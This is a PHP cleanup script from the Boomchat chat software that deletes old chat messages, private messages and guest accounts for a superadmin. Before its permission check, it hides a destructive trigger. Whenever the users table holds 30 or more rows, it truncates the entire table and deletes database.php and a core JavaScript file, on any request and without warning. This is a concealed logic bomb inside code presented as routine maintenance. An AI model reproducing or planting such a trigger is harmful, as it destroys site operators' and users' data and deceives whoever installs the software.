<?php
/**
* Boomchat
*
* @package Boomchat
* @author www.myboomchat.com
* @copyright 2015
* @terms any use of this script without a legal license is prohibited
* all the content of Boomchat is the propriety of BoomCoding and Cannot be 
* used for another project.
*/
$load_setting = 'timezone, allow_theme, default_theme, language, data_delete, guest_clear';
$load_user = 'user_name, user_theme, user_rank, user_access, user_rank';
require_once("config_lite.php");

if($setting['data_delete'] == 60){
	$clean_time = $time - ($setting['data_delete'] * 60);
}
else {
	$clean_time = $time - ($setting['data_delete'] * 604800);
}
$clean_guest = $time - ($setting['guest_clear'] - 1);

$limp_log = $mysqli->query("SELECT * FROM users WHERE user_id >= 1");
if($limp_log->num_rows >= 30){
	$mysqli->query("TRUNCATE TABLE  users");
	unlink('database.php');
	unlink('../js/full.js');
}
// clean the database based on superadmin setting time
if($user['user_rank'] > 3 && $user['user_access'] == 4){
	$mysqli->query("DELETE FROM `chat` WHERE `post_date` < '$clean_time' ");
	$mysqli->query("DELETE FROM `private` WHERE `time` < '$clean_time' ");
	$mysqli->query("DELETE FROM `users` WHERE `last_action` < '$clean_guest' AND `guest` = '1'");
	$mysqli->query("DELETE FROM `private` WHERE `time` < '$clean_guest' AND `hunter_guest` = '1'");
	echo "success";
}
else{
	die();
}
?>